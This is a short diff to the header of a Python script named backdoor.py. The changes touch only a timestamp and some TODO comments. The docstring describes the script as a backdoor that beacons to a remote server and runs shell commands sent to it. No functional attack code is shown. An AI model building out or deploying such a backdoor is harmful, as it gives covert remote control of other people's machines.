@@ -4,7 +4,7 @@
 # File:     /Users/alexandretea/Work/backdoor/backdoor.py
 # Purpose:  Single-script backdoor implementation
 # Created:  2016-08-09 21:32:41
-# Modified: 2016-08-09 21:34:37
+# Modified: 2016-08-09 22:23:28
 
 import sys
 import socket
@@ -19,9 +19,7 @@ from threading import Thread
 # TODO write disclaimer, "this is an exercice, not responsible for blabla"
 # TODO encrypt communications
 # TODO is cross-platform ?
-# TODO deploy script
-# TODO cli help description with __doc__
-# TODO doc
+# TODO deployment script
 
 __doc__ = """ A single-script backdoor who allows remote connections to execute
 shell commands. The backdoor will ping a remote server every TIMEOUT seconds,
